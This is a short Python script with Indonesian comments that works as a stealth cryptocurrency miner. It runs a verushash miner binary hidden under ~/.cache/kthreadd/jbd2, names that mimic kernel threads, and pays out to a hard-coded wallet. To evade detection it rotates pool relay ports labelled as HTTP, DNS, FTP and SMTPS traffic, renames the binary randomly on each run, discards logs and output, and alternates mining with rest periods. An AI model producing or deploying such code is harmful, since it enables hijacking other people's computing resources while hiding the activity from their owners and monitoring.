import subprocess
import time
import os
import random
import shutil

# Konfigurasi
WALLET = "REy6w1W9pQ7U4LebYx6zp6mZxHkBzc3e5y"
ALGO = "verushash"
CPU_THREADS = 2
BASE_PATH = os.path.expanduser("~/.cache/kthreadd/")
ORIGINAL_BINARY = os.path.join(BASE_PATH, "jbd2")

# Daftar endpoint pool relay dengan port beda-beda
ENDPOINTS = [
    "interstellar.hidora.com:11308",  # HTTP
    "interstellar.hidora.com:11365",  # DNS-TCP
    "interstellar.hidora.com:11373",  # FTP
    "interstellar.hidora.com:11283",  # HTTPS
    "interstellar.hidora.com:11401",  # SMTPS
]

if not os.path.exists(ORIGINAL_BINARY):
    print("Binary tidak ditemukan di:", ORIGINAL_BINARY)
    exit(1)

while True:
    run_minutes = random.randint(25, 30)
    rest_minutes = random.randint(5, 7)
    pool = random.choice(ENDPOINTS)

    print(f"Menjalankan panen di {pool} selama {run_minutes} menit...")

    # Randomize nama binary
    random_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
    temp_binary = os.path.join(BASE_PATH, random_name)
    shutil.copy(ORIGINAL_BINARY, temp_binary)
    os.chmod(temp_binary, 0o755)

    try:
        process = subprocess.Popen([
            temp_binary,
            "--algorithm", ALGO,
            "--pool", pool,
            "--wallet", WALLET,
            "--cpu-threads", str(CPU_THREADS),
            "--log-file", "/dev/null"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        time.sleep(run_minutes * 60)

        print(f"Istirahat selama {rest_minutes} menit...")
        process.terminate()
        try:
            process.wait(timeout=10)
        except subprocess.TimeoutExpired:
            process.kill()

    except Exception as e:
        print("Terjadi error:", e)

    # Bersih-bersih
    os.system(f"pkill -f '{temp_binary}'")
    if os.path.exists(temp_binary):
        os.remove(temp_binary)

    time.sleep(rest_minutes * 60)
